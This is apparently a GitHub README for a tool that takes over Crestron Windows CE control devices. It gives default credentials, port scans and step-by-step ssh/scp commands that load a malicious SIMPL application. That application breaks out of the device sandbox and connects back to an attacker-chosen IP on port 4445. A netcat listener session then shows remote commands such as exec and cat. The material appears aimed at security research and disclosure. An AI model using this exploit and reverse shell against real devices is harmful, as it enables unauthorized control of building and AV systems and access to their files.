# crestron
Tools for taking over Crestron Windows CE devices without the need for Crestron Toolbox.

If you have authenticated access, or the default `crestron:<blank>` credentials are still enabled, you can use the provided Simpl application to load a malicious application that breaks out of the sandbox to connect back to you.

The ports available to the interface can change depending on the device type, and whether you are looking at the control side or the LAN side. If the device has only the LAN interface connected, it will listen with all ports on that interface. Otherwise, the control ports will be listening on the control interface. The key ports are 21, 22, 23, 843, 41794, or 41795.

```
Brandons-iMac:~ bperry$ nmap 192.168.1.174
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-01 13:46 CDT
Nmap scan report for DMPS3-7f81812f.attlocal.net (192.168.1.174)
Host is up (0.0036s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
80/tcp   open  http
443/tcp  open  https
843/tcp  open  unknown
6510/tcp open  mcer-port
```

This assumes you are starting from a clean slate. If you would like to factory reset the device to ensure nothing weird happens, SSH into the device and run `RESTORE`.
```
mkdir tmp
cd tmp
unzip ../pro3.lpz
ssh crestron@192.168.1.240 del \\User\\*
scp * crestron@192.168.1.240:\\User
ssh crestron@192.168.1.240 copy \\User\\boot.bt \\Simpl\\App01\\
ssh crestron@192.168.1.240 copy \\User\\fdsa_archive.zip \\Simpl\\App01\\
ssh crestron@192.168.1.240 copy \\User\\fdsa.bin \\Simpl\\App01\\
ssh crestron@192.168.1.240 copy \\User\\fdsa.cdm \\Simpl\\App01\\
ssh crestron@192.168.1.240 copy \\User\\fdsa.dll \\Simpl\\App01\\
ssh crestron@192.168.1.240 copy \\User\\fdsa.rte \\Simpl\\App01\\
ssh crestron@192.168.1.240 copy \\User\\SimplSharpCustomAttributesInterface.dll \\Simpl\\App01\\
ssh crestron@192.168.1.240 copy \\User\\SimplSharpData.dat \\Simpl\\App01\\
ssh crestron@192.168.1.240 copy \\User\\SimplSharpHelperInterface.dll \\Simpl\\App01\\
ssh crestron@192.168.1.240 copy \\User\\SplusLibrary.dll \\Simpl\\App01\\
ssh crestron@192.168.1.240 copy \\User\\SplusManagerApp.exe \\Simpl\\App01\\
ssh crestron@192.168.1.240 copy \\User\\SplusObjects.dll \\Simpl\\App01\\
ssh crestron@192.168.1.240 progregister -P:all
ssh crestron@192.168.1.240 progreset

```

# Other Devices

If you can telnet or SSH into the device, the command prompt will contain the RackType that you can update boot.bt with.

```
bperry@bperry-Precision-T5610:/tmp/zip$ telnet 192.168.1.174
Trying 192.168.1.174...
Connected to 192.168.1.174.
Escape character is '^]'.
DMPS3-4K-150-C Console
Warning: Another console session is open 

DMPS3-4K-150-C>

```

In boot.bt, the RackType is in the first stanza and by default is the PRO3.

```
[LG_BOOT_DATA]
BinFileName=fdsa.bin
SMWFileName=fdsa.smw
NumberSymbols=15
NumberSignals=33
RouteFileName=fdsa.rte
CUZ=1.007.0017
RackType=PRO3
SymParamVersion=21.007.0017
NumberParameters=3
NumRealIntegralParams=0
NumRealStringParams=3
NVRAMUsed=0

[...snip...]
```

Replacing PRO3 with the device type will ensure the device does not reject the application.

# Using the shell

The shell expects a \User\ip file with the IP address to connect back to. Port 4445 is hardcoded.

```
echo -n 192.168.1.123 > ip
scp ip crestron@192.168.1.174:/User
```

Once the connection is made, you can begin insteracting outside of the sandbox.

```
Brandons-iMac:~ bperry$ nc -l 4445
Connected
 > ls
\Network
\Windows
\Temp
\Program Files
\My Documents
\HTML
\Sys
\Simpl
\Nvram
\FTP
\User
\ROMDISK
\Application Data
\My Recent Documents
\Recycled
\SSHBanner
 >  
 ```
 
 For instance, compared to the sandbox directory list.
 
 ```
 Brandons-iMac:~ bperry$ telnet 192.168.1.174
Trying 192.168.1.174...
Connected to dmps3-7f81812f.attlocal.net.
Escape character is '^]'.
DMPS3-4K-150-C Console
Warning: Another console session is open 

DMPS3-4K-150-C>dir
Directory of \
       [DIR]  09-21-15 08:58:24 FTP
       [DIR]  09-21-15 08:58:24 HTML
       [DIR]  09-21-15 08:58:24 Nvram
       [DIR]  09-21-15 08:58:26 ROMDISK
       [DIR]  09-21-15 08:58:24 Simpl
       [DIR]  09-21-15 09:05:26 SSHBanner
       [DIR]  09-21-15 08:58:24 Sys
       [DIR]  09-21-15 08:58:26 User

DMPS3-4K-150-C>
```

Available commands are `ls`, `pwd`, `exec`, `cat`, `cd`, and `base64`.

On PRO3, for instance, you can run a graphics test executable for demonstration of the issue.

```
 > exec \Windows\cube.exe
```

A spinning cube will replace the Crestron menu on the display.
